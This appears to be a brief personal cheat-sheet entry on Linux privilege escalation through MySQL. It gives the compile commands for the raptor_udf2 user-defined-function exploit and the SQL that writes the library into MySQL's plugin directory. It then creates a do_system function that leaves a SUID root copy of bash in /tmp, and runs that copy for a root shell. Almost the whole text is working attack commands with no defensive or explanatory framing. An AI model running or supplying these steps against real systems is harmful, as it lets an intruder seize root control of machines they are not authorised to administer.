---
description: when wanna privilege a system, using mysql DB
---

# mysql

first, go to mysql location and compile it :&#x20;

```bash
cd /home/user/tools/mysql-udf

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

mysql -u root
```

now run these commands on mysql console to get root shell :&#x20;

{% code overflow="wrap" %}
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

# Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
{% endcode %}

then, exit and run the file you made at /tmp/rootbash :&#x20;

```bash
/tmp/rootbash -p
```

